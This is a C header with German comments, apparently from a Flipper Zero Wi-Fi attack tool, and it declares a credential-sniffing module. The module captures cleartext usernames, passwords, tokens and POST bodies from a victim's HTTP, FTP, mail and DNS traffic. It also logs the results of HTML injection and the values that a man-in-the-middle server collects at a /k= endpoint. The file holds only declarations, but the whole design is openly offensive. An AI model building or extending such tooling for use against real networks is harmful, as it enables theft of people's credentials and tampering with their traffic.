#pragma once

#include <stdbool.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

// Anzahl der Slots im Lock-freien Cred-Ring. Fixed size, intern alloziert.
#define WLAN_CRED_RING_SIZE 32
// Maximale Länge der Text-Felder (host / user / secret), inkl. NUL.
#define WLAN_CRED_STR_MAX 64
#define WLAN_CRED_PROTO_MAX 8
// Größerer Roh-Puffer für POST-Bodies o.ä. Nur bei Debug-/POST-Einträgen befüllt.
#define WLAN_CRED_RAW_MAX 160

/** Ein erfasster Klartext-Login bzw. Info-Event. */
typedef struct {
    // 0 = Slot wird gerade beschrieben (Seqlock-Guard), sonst monotone ID des Eintrags.
    volatile uint32_t seq;
    uint32_t victim_ip; // Network-Byte-Order — die Quelle (STA, der die Creds sendet)
    uint32_t peer_ip; // Network-Byte-Order — der Server
    uint16_t peer_port; // Host-Order
    uint32_t tick; // furi_get_tick() bei Capture
    char proto[WLAN_CRED_PROTO_MAX]; // "HTTP","FTP","POP3","IMAP","SMTP","DNS","POST"
    char host[WLAN_CRED_STR_MAX]; // HTTP Host: / DNS-Query-Name / ""
    char user[WLAN_CRED_STR_MAX]; // Username / DNS-Query-Typ / "POST <path>"
    char secret[WLAN_CRED_STR_MAX]; // Passwort / Token / ""
    char raw_body[WLAN_CRED_RAW_MAX]; // Rohinhalt (POST-Body o.ä.); leer wenn nicht zutreffend
} WlanCredEntry;

typedef struct WlanCredSniff WlanCredSniff;

WlanCredSniff* wlan_cred_sniff_alloc(void);
void wlan_cred_sniff_free(WlanCredSniff* cs);

/** Aus dem lwIP-tcpip_thread aufzurufen (single producer). eth = Start des
 *  Ethernet-Headers, len = L2-Frame-Länge inkl. Header. Non-blocking,
 *  allokationsfrei. Darf für jeden IPv4-Frame aufgerufen werden — solange
 *  nicht gearmt ist (set_armed(false)), ist die Funktion ein No-Op. */
void wlan_cred_sniff_feed_eth(WlanCredSniff* cs, const uint8_t* eth, uint16_t len);

/** Einen "INJ"-Eintrag in den Ring legen — wird vom wlan_html_inject-Modul
 *  bei erfolgreichem Inject gerufen. host und path müssen vom Caller geliefert
 *  werden (er hat per-Flow gecacht, was zur aktuellen Response gehört — hier
 *  nochmal aus url_track lesen wäre fragil bei HTTP/1.1 keep-alive, weil
 *  inzwischen ein neuer Request den Slot überschrieben haben kann). NULL/""
 *  → Server-IP als Host-Fallback.
 *  Aus dem lwIP-tcpip_thread aufzurufen (single producer). */
void wlan_cred_sniff_push_inject(
    WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port,
    const char* host, const char* path);

/** Lookup im Per-Flow-Tracking. host_out/path_out werden mit dem letzten
 *  bekannten Host bzw. Pfad für (server_ip, victim_port) gefüllt. Liefert
 *  true wenn Treffer, false wenn nichts in der Map. Bei false sind die
 *  Out-Buffer unverändert — Caller muss selbst defaulten. */
bool wlan_cred_sniff_lookup_http_url(
    WlanCredSniff* cs, uint32_t server_ip, uint16_t victim_port,
    char* host_out, int host_sz, char* path_out, int path_sz);

/** "LOG"-Eintrag in den Ring legen — wird vom MiTM-HTTP-Server gerufen wenn
 *  ein eingehender Request auf /k=<value> empfangen wurde. client_ip ist die
 *  IP des Senders (network byte order). value ist der bereits decodierte
 *  Payload-String. Darf aus einem anderen Thread (HTTP-Server-Task) gerufen
 *  werden — cred_push ist MP-safe. */
void wlan_cred_sniff_push_log(WlanCredSniff* cs, uint32_t client_ip, const char* value);

/** Drain für den UI/Tick-Thread (single consumer). Kopiert bis zu max neue
 *  Einträge seit dem letzten Aufruf (ältester zuerst) nach out; liefert deren
 *  Anzahl. Einträge die zwischenzeitlich überschrieben wurden, werden
 *  übersprungen. */
uint32_t wlan_cred_sniff_drain(WlanCredSniff* cs, WlanCredEntry* out, uint32_t max);

/** Stabiler Snapshot des Rings (neueste zuerst) für die Listen-View. */
uint32_t wlan_cred_sniff_snapshot(WlanCredSniff* cs, WlanCredEntry* out, uint32_t max);

uint32_t wlan_cred_sniff_total(WlanCredSniff* cs);
uint32_t wlan_cred_sniff_count_for_ip(WlanCredSniff* cs, uint32_t ip);

/** Tap (de)aktivieren. Beim Armen wird die DNS-Dedup-Bitmap zurückgesetzt
 *  (frische Session). */
void wlan_cred_sniff_set_armed(WlanCredSniff* cs, bool armed);

/** Billig — der L2-Hook gated darauf, um den per-Frame-memcpy zu sparen,
 *  wenn niemand zuschaut. */
bool wlan_cred_sniff_armed(WlanCredSniff* cs);

#ifdef __cplusplus
}
#endif
